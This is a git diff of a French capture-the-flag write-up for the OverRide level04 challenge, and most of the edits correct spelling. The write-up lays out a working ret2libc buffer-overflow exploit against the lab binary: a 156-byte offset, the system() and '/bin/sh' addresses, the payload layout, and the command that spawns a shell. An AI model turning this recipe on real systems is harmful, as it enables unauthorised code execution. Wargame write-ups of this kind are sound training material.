@@ -6,13 +6,13 @@ level04@OverRide:~$
 
 ➜  override git:(main) ✗ scp -P 4242 level04@192.168.1.28:/home/users/level04/level04 ./bin/.
 
-decompilation
+décompilation
 
 on peut utiliser gets(shellcode_buf); pour overflow (128octets) mais
 on ne peut pas utiliser exec sinon le programme se fait kill
 
 on veut calculer l'offset avec https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-qui nous donne un patern non repetitif:
+qui nous donne un pattern non répétitif:
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9
 level04@OverRide:~$ gdb ./level04 
 (gdb) disassemble main 
@@ -39,10 +39,9 @@ https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 qui nous donne un offset de 156
 
 
-156(Offset) - 67(size shellcode) = 89
 
 
-on ne peux pas utiliser exec donc on vas faire un ret2libc
+on ne peut pas utiliser exec donc on va faire un ret2libc
 on recherche l'address de system().
 
 level04@OverRide:~$ gdb ./level04
@@ -77,7 +76,7 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 0xf7e6aed0 address de system
 0xf7f897ec address de "/bin/sh"
 
-A*156 (octets jusqu'a esp/eip) + 0xf7e6aed0 (address system) + AAAA(fausse adresse de retour de system/padding pour pas que ce soit les 4 premiers octets de /bin/sh qui soit pris en compte par system comme addresse de retour) + 0xf7f897ec (premiere argument de system "/bin/sh")
+A*156 (octets jusqu'à esp/eip) + 0xf7e6aed0 (address system) + AAAA(fausse adresse de retour de system/padding pour pas que ce soit les 4 premiers octets de /bin/sh qui soit pris en compte par system comme addresse de retour) + 0xf7f897ec (premier argument de system "/bin/sh")
 
 
 level04@OverRide:~$ (python /tmp/sc.py; cat) | ./level04
